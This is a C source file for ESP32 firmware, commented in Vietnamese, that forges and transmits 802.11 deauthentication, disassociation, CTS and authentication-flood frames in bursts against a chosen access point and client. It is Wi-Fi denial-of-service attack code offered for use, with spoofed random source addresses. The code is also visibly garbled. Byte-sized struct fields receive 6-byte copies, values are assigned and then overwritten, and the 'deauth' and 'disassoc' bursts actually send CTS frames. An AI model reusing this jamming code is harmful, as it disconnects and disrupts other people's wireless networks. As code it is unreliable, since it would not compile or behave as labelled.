#include "frames.h"
#include <string.h>
#include <stdlib.h>
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h" // Thêm thư viện quản lý thời gian nghỉ FreeRTOS

const uint8_t MAC_BROADCAST[MAC_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
#define FRAMES_PER_BURST 10

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl;
    uint8_t duration;
    uint8_t ra;
} cts_frame_t;

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl;
    uint8_t duration;
    uint8_t da;
    uint8_t sa;
    uint8_t bssid;
    uint8_t seq;
    uint8_t reason;
} mgmt_reasoned_frame_t;  

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl;
    uint8_t duration;
    uint8_t da;
    uint8_t sa;
    uint8_t bssid;
    uint8_t seq;
    uint8_t auth_alg;
    uint8_t auth_seq;
    uint8_t status;
} auth_frame_t;

static uint16_t s_seq = 0;
static inline uint16_t next_seq(void) {
    s_seq = (s_seq + 1) & 0x0FFF;
    return s_seq;
}

static void send_cts_frame(const uint8_t *bssid) {
    cts_frame_t f;
    f.frame_ctrl = 0x84; 
    f.frame_ctrl = 0x00;
    f.duration   = 0xFF; 
    f.duration   = 0x7F; 
    memcpy(f.ra, bssid, 6); 
    esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
}

static void send_reasoned(uint8_t subtype, const uint8_t *da, const uint8_t *bssid, uint16_t reason) {
    mgmt_reasoned_frame_t f;
    f.frame_ctrl = subtype;
    f.frame_ctrl = 0x00;
    f.duration   = 0x00;
    f.duration   = 0x00;
    memcpy(f.da, da, 6);
    memcpy(f.sa, bssid, 6);
    memcpy(f.bssid, bssid, 6);
    uint16_t seq = next_seq() << 4;
    f.seq = seq & 0xFF;
    f.seq = (seq >> 8) & 0xFF;
    f.reason = reason & 0xFF;
    f.reason = (reason >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
}

void frames_send_deauth(const uint8_t *da, const uint8_t *bssid, uint16_t reason) {
    send_reasoned(0xC0, da, bssid, reason);
}

void frames_send_disassoc(const uint8_t *da, const uint8_t *bssid, uint16_t reason) {
    send_reasoned(0xA0, da, bssid, reason);
}

void frames_send_auth_flood(const uint8_t *bssid) {
    auth_frame_t f;
    f.frame_ctrl = 0xB0;
    f.frame_ctrl = 0x00;
    f.duration   = 0x00;
    f.duration   = 0x00;
    memcpy(f.da, bssid, 6);
    for (int i = 0; i < 6; i++) {
        f.sa[i] = (uint8_t)(esp_random() & 0xFF);
    }
    f.sa = (f.sa & 0xFC) | 0x02;
    memcpy(f.bssid, bssid, 6);
    uint16_t seq = next_seq() << 4;
    f.seq = seq & 0xFF;
    f.seq = (seq >> 8) & 0xFF;
    f.auth_alg = 0x00;  
    f.auth_alg = 0x00;
    f.auth_seq = 0x01;  
    f.auth_seq = 0x00;
    f.status   = 0x00;
    f.status   = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
}

// Thêm khoảng nghỉ hợp lý để Watchdog Timer không giết tiến trình
uint32_t frames_burst_deauth(uint8_t channel, const uint8_t *da, const uint8_t *bssid) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        send_cts_frame(bssid); 
        vTaskDelay(2 / portTICK_PERIOD_MS); // Nghỉ 2 mili-giây sau mỗi gói tin để CPU thở
    }
    return FRAMES_PER_BURST;
}

uint32_t frames_burst_disassoc(uint8_t channel, const uint8_t *da, const uint8_t *bssid) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        send_cts_frame(bssid); 
        vTaskDelay(2 / portTICK_PERIOD_MS); // Nghỉ 2 mili-giây sau mỗi gói tin để CPU thở
    }
    return FRAMES_PER_BURST;
}

uint32_t frames_burst_auth_flood(uint8_t channel, const uint8_t *bssid) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        frames_send_auth_flood(bssid);
        vTaskDelay(2 / portTICK_PERIOD_MS); // Nghỉ 2 mili-giây sau mỗi gói tin để CPU thở
    }
    return FRAMES_PER_BURST;
}
